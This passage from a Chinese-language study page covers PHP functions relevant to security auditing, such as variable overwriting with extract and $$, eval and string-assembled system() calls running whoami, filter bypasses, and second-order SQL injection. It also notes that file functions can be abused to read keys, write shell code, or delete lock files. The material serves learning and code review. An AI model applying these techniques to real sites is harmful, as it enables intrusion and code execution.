src="http://static.zybuluo.com/1kbfree/v6c48k8uhhan8wid021wdjdv/image_1cf5k429h93b1t2dls83t6db919.png" alt="image_1cavlibuatcrb7u1qbv6ni1p9.png-17.3kB"></p><hr><p><strong>readfile()用法：</strong></p><blockquote><p>定义和用法</p></blockquote><p><code>readfile()</code> 函数输出一个文件。<br>该函数读入一个文件并写入到输出缓冲。<br>若成功，则返回从文件中读入的内容与字节数。若失败，则返回 false。您可以通过 <code>@readfile()</code> 形式调用该函数，来隐藏错误信息。</p><p><code>readfile( filename,include_path,context )</code></p><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">filename</td><td style="text-align:center">必需。规定要读取的文件。</td></tr><tr><td style="text-align:center">include_path</td><td style="text-align:center">可选。如果也想在include_path中搜索文件，可以使用该参数并将其设为 true。</td></tr><tr><td style="text-align:center">context</td><td style="text-align:center">可选。规定文件句柄的环境。Context 是可以修改流的行为的一套选项。</td></tr></tbody></table><p><strong><br>代码</strong>:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> readfile( <span class="string">'cai_team.txt'</span> );</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/1kbfree/v6c48k8uhhan8wid021wdjdv/image_1cf5k429h93b1t2dls83t6db919.png" alt="image_1cf5k429h93b1t2dls83t6db919.png-42.2kB"></p><hr><h3 id="执行转换"><a href="#执行转换" class="headerlink" title="执行转换:"></a>执行转换:</h3><table><thead><tr><th style="text-align:left">字符</th><th style="text-align:left">替换后</th></tr></thead><tbody><tr><td style="text-align:left">&amp; (&amp; 符号)</td><td style="text-align:left"><code>&amp;amp;</code></td></tr><tr><td style="text-align:left">“ (双引号)</td><td style="text-align:left"><code>&amp;quot;</code>，除非设置了 ENT_NOQUOTES</td></tr><tr><td style="text-align:left">‘ (单引号)</td><td style="text-align:left">设置了 ENT_QUOTES 后， &#039; (如果是 ENT_HTML401) ，或者 &apos; (如果是 ENT_XML1、ENT_XHTML 或 ENT_HTML5)。</td></tr><tr><td style="text-align:left">&lt; (小于)</td><td style="text-align:left"><code>&amp;lt</code></td></tr><tr><td style="text-align:left">> (大于)</td><td style="text-align:left"><code>&amp;gt</code></td></tr></tbody></table><hr><p><strong>extract()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/bbsz4gdm60bwu3xpa3bb09k2/image_1cb2cblp6lpb19ku1ouu4d81h701t.png" alt="image_1cb2cblp6lpb19ku1ouu4d81h701t.png-32.2kB"></p><hr><p><strong>parse_str()：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    parse_str(<span class="string">'name=iamfree'</span>); <span class="comment">//把name变成变量名，iamfree变成变量值</span></span><br><span class="line">    <span class="keyword">echo</span> $name;<span class="comment">//输出iamfree</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><p><strong>import_request_variables():</strong></p><p><em>此函数把GET、POST、COOKIE的参数注册为变量，一般不建议开启</em></p><blockquote><p>注意,只在 <code>PHP4.1</code>到<code>PHP5.4</code>之间可用</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    $name = <span class="string">'whoami'</span>;</span><br><span class="line">    import_request_variables(<span class="string">'GP'</span>); <span class="comment">//G表示GET、P表示POST如果有C表示COOKIE；这里的GP表示注册GET和POST请求的参数为变量</span></span><br><span class="line">    <span class="keyword">echo</span> $name;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果：</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://static.zybuluo.com/1kbfree/n09o5bhlvrv1my1f2zqxgf4q/image_1cckvkb6b186c6g11p8ojf4lbd9.png" alt="image_1cckvkb6b186c6g11p8ojf4lbd9.png-54.1kB"></h2><p><strong>array_key_exists()：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_key_exists ( $key , $array )</span><br></pre></td></tr></table></figure></p><blockquote><p>数组里有键 key 时，array_key_exists() 返回 TRUE。 key 可以是任何能作为数组索引的值。</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/wkcc7p351cowwqz1k9hjbwy3/image_1cba1lh3okkkg0n1qkp1uuc104v9.png" alt="image_1cba1lh3okkkg0n1qkp1uuc104v9.png-16.1kB"></p><hr><p><strong>str_ireplace过滤sql语句：</strong><br><img src="http://static.zybuluo.com/1kbfree/hmfq9fei2t8khzcusyszh8i3/str_ireplace.png" alt="str_ireplace.png-816.7kB"><br><strong>此函数用法：</strong><br><img src="http://static.zybuluo.com/1kbfree/7yuotvm35lw7w6zzdr1q414y/str_ireplace%E7%94%A8%E6%B3%95.png" alt="str_ireplace用法.png-6.4kB"><br><em>将 whoami? 中的 whoami 被 iamfree 替换，也就是说把whoami?里的whoami替换成iamfree所以结果就是iamfree?</em></p><p><strong>这里其实是可以绕过的，比如：</strong><br><img src="http://static.zybuluo.com/1kbfree/1vaj8guxs3swd43zh3uvkqbb/image_1caugtd8fj54ke9tf112cr1qbl4h.png" alt="image_1caugtd8fj54ke9tf112cr1qbl4h.png-150.2kB"></p><hr><p><strong>变量覆盖:</strong><br><img src="http://static.zybuluo.com/1kbfree/p5uq0jbmj08gy7607w66rm51/image_1cbrhvola1igmjhm15mc1rsqed816.png" alt="image_1cbrhvola1igmjhm15mc1rsqed816.png-33.4kB"><br><img src="http://static.zybuluo.com/1kbfree/wfifd51c43j7d5zdxsg08bd1/image_1cbri0lsa1tuc1erh1d5q1drsdre1j.png" alt="image_1cbri0lsa1tuc1erh1d5q1drsdre1j.png-70.7kB"></p><p><strong>难一点的：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">array</span>( <span class="string">'_GET'</span>,<span class="string">'_POST'</span> ) <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($$value <span class="keyword">as</span> $_key =&gt; $_value)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $_key.<span class="string">':'</span>.$_value;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br &gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>执行后的结果：</strong><br><img src="http://static.zybuluo.com/1kbfree/n7f97a459waufv27gbwrmsv0/image_1ccl9ivq22vk1pdat631f7oq8s1g.png" alt="image_1ccl9ivq22vk1pdat631f7oq8s1g.png-32.5kB"></p><hr><p><strong>define()用法:</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    define(<span class="string">'t'</span>,time()); <span class="comment">//把time()的返回值定义为常量(t)    </span></span><br><span class="line">    <span class="keyword">echo</span> t;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="http://static.zybuluo.com/1kbfree/3l030blxz655udwgyqy75sei/image_1ccl95vnr10rv1el118e91bdl155m13.png" alt="image_1ccl95vnr10rv1el118e91bdl155m13.png-73.9kB"></h2><p><strong>三元表达式:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    $name = !<span class="keyword">empty</span>($_GET[<span class="string">'name'</span>]) ? $_GET[<span class="string">'name'</span>] : <span class="string">'此人无名'</span>; <span class="comment">//表示如果$_GET['name']不为空的话就返回$_GET['name']如果为空就返回 此人无名。</span></span><br><span class="line">    <span class="keyword">echo</span> $name;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>还可以有一种判断方法：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) &amp;&amp; <span class="keyword">exit</span>(<span class="string">'exit'</span>); <span class="comment">//如果isset($_GET['name'])为真也就是name这个参数存在的时候，会执行exit('exit')，相反，不存在的时候不会执行exit('exit')   </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>name参数不存在时：</strong><br><img src="http://static.zybuluo.com/1kbfree/0oayqf6kulmddjdriml2wcsj/image_1ccl8dgoon1s7l1i4d2bh2449.png" alt="image_1ccl8dgoon1s7l1i4d2bh2449.png-46.7kB"></p><p><strong>name参数存在时：</strong><br><img src="http://static.zybuluo.com/1kbfree/viyokepu5q9wjmjpbfil69fi/image_1ccl8eog3koq1oa41g4210elf3sm.png" alt="image_1ccl8eog3koq1oa41g4210elf3sm.png-68.8kB"></p><hr><p><strong>nl2br()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/ikn2i2mm0kgfze57ygqzlc1g/image_1cbrhga1o1i0t1vnl2611jojbkip.png" alt="image_1cbrhga1o1i0t1vnl2611jojbkip.png-22.5kB"></p><hr><p><strong>eval()函数:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$string = <span class="string">'cup'</span>;</span><br><span class="line">$name = <span class="string">'coffee'</span>;</span><br><span class="line">$str = <span class="string">'This is a $string with my $name in it.'</span>;</span><br><span class="line"><span class="keyword">echo</span> $str. <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"\$str = \"$str\";"</span>);</span><br><span class="line"><span class="keyword">echo</span> $str. <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>输出：</strong><br><code>This is a $string with my $name in it.</code><br><code>This is a cup with my coffee in it.</code></p><hr><p><strong>explode()函数:</strong></p><blockquote><p>也就是拆分</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/tg27cykixmiyflsw0dofm2bw/image_1ca61lt671266hda1loq1om3gr411.png" alt="image_1ca61lt671266hda1loq1om3gr411.png-28.6kB"></p><hr><p><strong>copy()函数:</strong></p><p><code>copy(source,destination)</code><br>参数 |    描述<br>:-:  | :-:<br>source | 必需。规定要复制的文件。<br>destination | 必需。规定复制文件的目的地。</p><p><strong>将文件从 source 拷贝到 destination。如果成功则返回 TRUE，否则返回 FALSE。</strong></p><hr><p><strong>trim()函数:</strong><br>移除字符串两侧的空格等特殊字符<br><img src="http://static.zybuluo.com/1kbfree/kn3q9kwiadvmp2238ix16c7r/image_1capbh1qhm8vhmp1nu212q7100hm.png" alt="移除字符串两侧的空格等特殊字符.png-14.7kB"></p><hr><p><strong>strcasecmp()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/iaqdvoetw2l610xgofrbqdje/image_1calh2fsf1pjn50b1nh11h0v1v3d9.png" alt="image_1calh2fsf1pjn50b1nh11h0v1v3d9.png-39.5kB"></p><hr><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式:"></a>正则表达式:</h1><p><strong>preg_match()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/xo7lxkjibn4xcrha7t4basxn/image_1calhpof417poa9m1982vhh4n113.png" alt="preg_match函数的参数介绍"></p><p><strong>匹配一下<code>i</code>：</strong><br><img src="http://static.zybuluo.com/1kbfree/4d3lofhh58j9i4d4hkm12gsj/image_1cb2e316g1k9mdevmb11v3v15sm2a.png" alt="image_1cb2e316g1k9mdevmb11v3v15sm2a.png-16.9kB"><br><em>这里的<code>//</code>是定界符 ，之需要二处字符一样就可以，比如<code>== -- ?? 等等</code> 但是有些不能做定位符 比如a到z、A到Z、0到9、空格、\</em></p><p><strong>匹配全部英文字母(包括大写)：</strong><br><img src="http://static.zybuluo.com/1kbfree/3n619fqv4ix1af43vwtkffu7/image_1cb2e8ben2u160k1kuktn1n792n.png" alt="image_1cb2e8ben2u160k1kuktn1n792n.png-33kB"></p><p><strong>替换匹配到的内容:</strong><br><img src="http://static.zybuluo.com/1kbfree/9r393wz9lhgio1y8dmamo7pk/image_1cb2ej8kv1l2loph4hd2480l3h.png" alt="image_1cb2ej8kv1l2loph4hd2480l3h.png-20kB"></p><hr><p><strong>define()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/0sm19cmcccdtny7e32qjs4ud/image_1cau24b5jgimn6h6ge7sd8u19.png" alt="image_1cau24b5jgimn6h6ge7sd8u19.png-19.7kB"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(name,value,case_insensitive)</span><br></pre></td></tr></table></figure></p><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描叙</th></tr></thead><tbody><tr><td style="text-align:center">name</td><td style="text-align:center">必需。规定常量的名称。</td></tr><tr><td style="text-align:center">value</td><td style="text-align:center">必需。规定常量的值。</td></tr><tr><td style="text-align:center">case_insensitive</td><td style="text-align:center">可选。规定常量的名称是否对大小写敏感。</td></tr></tbody></table><p><em>若设置为 true，则对变量名大小写不敏感。默认是 false（大小写敏感）。</em></p><hr><p><strong>dirname()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/mxnhnvrlstywezjh66otbbck/image_1cau2i80e2ag1rp5a721pak1ku4m.png" alt="image_1cau2i80e2ag1rp5a721pak1ku4m.png-39.5kB"><br><code>dirname(path)</code><br>参数|描述<br>:–:|:–:<br>path|必需。规定要检查的路径。</p><p><em>该函数返回去掉文件名后的目录名</em></p><hr><p><strong>iconv()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/o51s3916gtn2hfrfzr1xn3yy/image_1cau44qdgb61h0u119k11ok1rda1g.png" alt="image_1cau44qdgb61h0u119k11ok1rda1g.png-60.5kB"><br><code>iconv ( in_charset , out_charset , str )</code><br>将字符串 str 从 in_charset 转换编码到 out_charset。 </p><p><strong>intval()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/odelzzq42smp1ujet5mx99os/image_1calj80va17dali6obj1bsj1371n.png" alt="image_1calj80va17dali6obj1bsj1371n.png-70.2kB"><br><em>还可以当防止SQL注入:</em><br><img src="http://static.zybuluo.com/1kbfree/me7ctcznhnh9vjhsgj1sx80v/image_1cartbh4v1thh1egn1iga1fcinu1g.png" alt="image_1cartbh4v1thh1egn1iga1fcinu1g.png-14.6kB"></p><hr><p><strong>reset()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/xefi1xpy95wf4er90jqv8nci/image_1camn387gtjs1pj6imq18fmoap.png" alt="image_1camn387gtjs1pj6imq18fmoap.png-57.2kB"></p><hr><p><strong><code>$$</code>变量覆盖:</strong><br><img src="http://static.zybuluo.com/1kbfree/iu6dbthijovu3ek690s9ml8k/image_1campm57rug6ul5e76u4h1ij216.png" alt="image_1campm57rug6ul5e76u4h1ij216.png-36.5kB"></p><p><strong>还有一个很有趣的：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    $g = <span class="string">'_GET'</span>;</span><br><span class="line">    $g = $$g; <span class="comment">//这个时候$$g的第二个$与$g的值拼接了变成了$_GET，第一个$变成了$g，所以$g=$_GET</span></span><br><span class="line">    <span class="keyword">echo</span> $g[<span class="string">'name'</span>];</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/1kbfree/b9lobeeywliqdiruv21fk0x9/image_1cckvtnv0fkgv9volmk581ue5m.png" alt="image_1cckvtnv0fkgv9volmk581ue5m.png-62.9kB"></p><hr><p><strong>isset()函数:检测变量是否已设置并且非 NULL</strong><br><strong>unset()函数:释放给定的变量</strong></p><hr><p><strong>parse_ini_file()  解析一个配置文件。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array parse_ini_file ( string $filename [, bool $process_sections = false [, int $scanner_mode = INI_SCANNER_NORMAL ]] )</span><br></pre></td></tr></table></figure></p><p>载入一个由 filename 指定的 ini 文件，并将其中的设置作为一个联合数组返回。</p><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td style="text-align:center">filename</td><td style="text-align:center">要解析的 ini 文件的文件名。</td></tr><tr><td style="text-align:center">process_sections</td><td style="text-align:center">如果将最后的 process_sections 参数设为 TRUE，将得到一个多维数组，包括了配置文件中每一节的名称和设置。process_sections 的默认值是 FALSE。</td></tr><tr><td style="text-align:center">scanner_mode</td><td style="text-align:center">Can either be INI_SCANNER_NORMAL (default) or INI_SCANNER_RAW. If INI_SCANNER_RAW is supplied, then option values will not be parsed.</td></tr></tbody></table><blockquote><p>返回值： 成功时以关联数组 array 返回设置，失败时返回 FALSE。</p></blockquote><hr><p><strong>urldecode()函数，可能会造成urldecode二次注入：</strong><br><img src="http://static.zybuluo.com/1kbfree/vckacpis6uv1zy6cq7x6z4ef/image_1cao633k6105ecv99s4pre14129.png" alt="image_1cao633k6105ecv99s4pre14129.png-32.1kB"></p><hr><p><strong>$_FILES用法:</strong><br><img src="http://static.zybuluo.com/1kbfree/5xn30q6ctgadfuuk8s2jhrda/image_1cb241vvp1ls511el1umg44v1oqi9.png" alt="image_1cb241vvp1ls511el1umg44v1oqi9.png-42.7kB"></p><p><img src="http://static.zybuluo.com/1kbfree/p6mqk381schtf7hjo84aimmx/image_1cb242979174ttbvod71k31e97m.png" alt="image_1cb242979174ttbvod71k31e97m.png-43.3kB"></p><p><img src="http://static.zybuluo.com/1kbfree/4zvsf8i84xbn8gqb9v51rzj4/image_1cb2494dpm70155kdea1i1217um13.png" alt="image_1cb2494dpm70155kdea1i1217um13.png-117.7kB"></p><hr><p><strong>is_numeric()函数：</strong></p><blockquote><p>判断是否为数字，是返回1，不是返回空</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/a425da6hg4dejq3orru2x19m/image_1cao6u6q0cd76121e244i910gm.png" alt="image_1cao6u6q0cd76121e244i910gm.png-24.7kB"></p><hr><p><strong>dvwa的sql注入的impossible等级源码(dvwa的impossible不存在sql注入)：</strong><br><img src="http://static.zybuluo.com/1kbfree/oz8rvt3lijvznmq5htw60vwg/image_1cao7j7051cek133f1oku1ek51vc13.png" alt="image_1cao7j7051cek133f1oku1ek51vc13.png-47.7kB"><br><em>当然  我看不懂这几行:</em><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">$data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br></pre></td></tr></table></figure></p><hr><p><strong>substr()函数:</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$rest = substr(<span class="string">"abcdef"</span>, <span class="number">-1</span>);    <span class="comment">// 返回 "f"</span></span><br><span class="line">$rest = substr(<span class="string">"abcdef"</span>, <span class="number">-2</span>);    <span class="comment">// 返回 "ef"</span></span><br><span class="line">$rest = substr(<span class="string">"abcdef"</span>, <span class="number">-3</span>, <span class="number">1</span>); <span class="comment">// 返回 "d"</span></span><br><span class="line"></span><br><span class="line">$rest = substr(<span class="string">"abcdef"</span>, <span class="number">0</span>, <span class="number">-1</span>);  <span class="comment">// 返回 "abcde"</span></span><br><span class="line">$rest = substr(<span class="string">"abcdef"</span>, <span class="number">2</span>, <span class="number">-1</span>);  <span class="comment">// 返回 "cde"</span></span><br><span class="line">$rest = substr(<span class="string">"abcdef"</span>, <span class="number">4</span>, <span class="number">-4</span>);  <span class="comment">// 返回 ""</span></span><br><span class="line">$rest = substr(<span class="string">"abcdef"</span>, <span class="number">-3</span>, <span class="number">-1</span>); <span class="comment">// 返回 "de"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><hr><p><strong>strrpos()函数:</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$foo = <span class="string">"0123456789a123456789b123456789c"</span>;</span><br><span class="line"></span><br><span class="line">var_dump(strrpos($foo, <span class="string">'7'</span>, <span class="number">-5</span>));  <span class="comment">// 从尾部第 5 个位置开始查找</span></span><br><span class="line">                                   <span class="comment">// 结果: int(17)</span></span><br><span class="line"></span><br><span class="line">var_dump(strrpos($foo, <span class="string">'7'</span>, <span class="number">20</span>));  <span class="comment">// 从第 20 个位置开始查找</span></span><br><span class="line">                                   <span class="comment">// 结果: int(27)</span></span><br><span class="line"></span><br><span class="line">var_dump(strrpos($foo, <span class="string">'7'</span>, <span class="number">28</span>));  <span class="comment">// 结果: bool(false)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><hr><p><strong>extract()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/w6zu2eq6hu95plscwo6eipwo/image_1capb8b1l16th19ectna124m6sp9.png" alt="image_1capb8b1l16th19ectna124m6sp9.png-46.6kB"></p><hr><p><strong>常见语法：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($a)) $a = <span class="string">'hello world'</span>; <span class="comment">//如果$a为空，那么它的值为hello world</span></span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$s = <span class="string">'sys'</span>.<span class="string">'tem'</span>;</span><br><span class="line">$s(<span class="string">'whoami'</span>); <span class="comment">//返回desktop-a0iqkh2\iamfree</span></span><br><span class="line"><span class="comment">/*这里就是执行了whoami的命令*/</span></span><br></pre></td></tr></table></figure><hr><p><strong>匿名函数：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$C_F = create_function(<span class="string">'$name'</span>,<span class="string">'return $name;'</span>); <span class="comment">//$name的位置是传递什么参数，第二个参数是函数里执行什么代码</span></span><br><span class="line"><span class="keyword">echo</span> $C_F(<span class="string">'iamfree'</span>); <span class="comment">//输出iamfree</span></span><br></pre></td></tr></table></figure></p><hr><p><strong>回调函数：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Func</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello $name"</span>;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="string">'Func'</span>,<span class="string">'iamfree'</span>); </span><br><span class="line"><span class="comment">/*输出:hello iamfree*/</span></span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(&apos;system&apos;,&apos;whoami&apos;);</span><br><span class="line">/*输出：desktop-a0iqkh2\iamfree*/</span><br></pre></td></tr></table></figure><hr><p><strong>命令执行函数：</strong></p><ul><li>exec() — 执行一个外部程序</li><li>passthru() — 执行外部程序并且显示原始输出</li><li>proc_open() — 执行一个命令，并且打开用来输入/输出的文件指针。</li><li>shell_exec() &amp; <code></code> — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</li><li>system() — 执行外部程序，并且显示输出</li><li>popen() — 通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。</li></ul><p><img src="http://static.zybuluo.com/1kbfree/a7jyan6kwd7dig28zvx5zzmc/image_1carr8bt51nu8inj1ovq1b3nai79.png" alt="image_1carr8bt51nu8inj1ovq1b3nai79.png-42.6kB"></p><hr><p><strong>文件操作函数：</strong></p><ul><li>copy — 拷贝文件</li><li>file_get_contents — 将整个文件读入一个字符串</li><li>file_put_contents — 将一个字符串写入文件</li><li>file — 把整个文件读入一个数组中</li><li>fopen — 打开文件或者 URL</li><li>move_uploaded_file — 将上传的文件移动到新位置</li><li>readfile — 输出文件</li><li>rename — 重命名一个文件或目录</li><li>rmdir — 删除目录</li><li>unlink &amp; delete — 删除文件</li></ul><blockquote><p>任意文件读取、写入、删除往往是上面几个函数受到了控制（当然还有其他的函数）。<br>不同的函数在不同的场景有不同的作用和不同的利用手法。<br>读取：可以读取配置等文件，拿到key<br>写入：可以写入shell代码相关的内容<br>删除：可以删除.lock文件而可以重新安装覆盖</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/ivg4xj91uyloaum2nyx2fsj2/image_1carrl00k1f4isqn1kthuu9o4rm.png" alt="image_1carrl00k1f4isqn1kthuu9o4rm.png-389.2kB"></p><hr><h2 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h2><h3 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h3><p><code>bool phpinfo ([ int $what = INFO_ALL ] )</code><br>输出 PHP 当前状态的大量信息，包含了PHP编译选项、启用的扩展、PHP版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path变量、配置选项的本地值和主值、HTTP头和PHP授权信息(License)。</p><h3 id="软连接-读取文件内容"><a href="#软连接-读取文件内容" class="headerlink" title="软连接-读取文件内容"></a>软连接-读取文件内容</h3><p><code>bool symlink ( string $target , string $link )</code><br><code>symlink()</code> 对于已有的 target 建立一个名为 link 的符号连接。<br><code>string readlink ( string $path )</code><br><code>readlink()</code> 和同名的 C 函数做同样的事，返回符号连接的内容。</p><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p><code>string getenv ( string $varname )</code><br><strong>获取一个环境变量的值。</strong><br><code>bool putenv ( string $setting )</code><br><strong>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。</strong> 在请求结束时环境会恢复到初始状态。</p><h3 id="加载扩展"><a href="#加载扩展" class="headerlink" title="加载扩展"></a>加载扩展</h3><p><code>bool dl ( string $library )</code><br>载入指定参数 library 的 PHP 扩展。</p><p><strong>配置相关</strong><br><code>string ini_get ( string $varname )</code></p><p><strong>成功时返回配置选项的值。</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string ini_set ( string $varname , string $newvalue )</span><br><span class="line">string ini_alter ( string $varname , string $newvalue )</span><br></pre></td></tr></table></figure></p><p>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。<br><code>void ini_restore ( string $varname )</code><br>恢复指定的配置选项到它的原始值。</p><p><strong>数字判断</strong><br><code>bool is_numeric ( mixed $var )</code><br>如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。<br>仅用is_numeric判断而不用intval转换就有可能插入16进制的字符串到数据库，进而可能导致sql二次注入。</p><p><strong>数组相关</strong><br><code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code><br>在 haystack 中搜索 needle，如果没有设置 strict 